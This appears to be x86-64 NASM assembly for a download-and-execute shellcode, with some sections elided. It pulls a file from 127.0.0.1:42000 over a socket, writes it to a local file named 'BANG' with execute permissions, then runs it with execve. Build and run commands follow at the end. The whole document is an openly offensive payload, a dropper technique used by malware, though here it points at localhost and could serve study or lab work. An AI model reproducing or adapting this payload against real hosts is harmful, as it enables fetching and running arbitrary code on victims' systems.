;-- download and execute file from 127.0.0.1:42000 --------------------------------//--
BITS 64
  org 0x100000000
;---------------------+------+-------------+------------------------------------------+
...
; open -------------------------------------------------------------------------
; We are creating a local file to save our socket buffer to.
; sys_open(filename,O_WRONLY|O_CREATE|O_TRUNC[0001.0100.1000=1101],700)
;  arg0: rdi = const char *pathname
;  arg1: rsi = int flags
;  arg2: rdx = mode_t mode 
  mov al, 2       ; The syscall
  push 0x474e4142 ; Filename BANG (GNAB here)
  mov rdi, rsp    ; Arg0: The file name
  mov rsi, 0x242  ; Arg1: Flags, testing 0x242
  mov rdx, 0x1c0  ; arg2: Mode / permissions (700)
  syscall
...
;  arg2: rdx = size_t count     
  ...
  je rwloop
; close(fd) --------------------------------------------------------------------
; Closing the file, otherwise we get SEGV_MAPERR
  mov rdi, r9 ; move fd to rdi
  mov rax, 3 ; This is the sys_close number
  syscall
; execve -----------------------------------------------------------------------
...
;  arg2: rdx = char *const envp[] 
  xor rax, rax        ; make 0
  mov rbx, 0x474e4142 ; our file BANG (GNAB here)
  push rbx            ; push this string to the stack
...
; Build
;  $ nasm -f bin dl_exec_218.asm -o dl_exec_218; chmod +x dl_exec_218
; Exec
;  $ ./dl_exec_218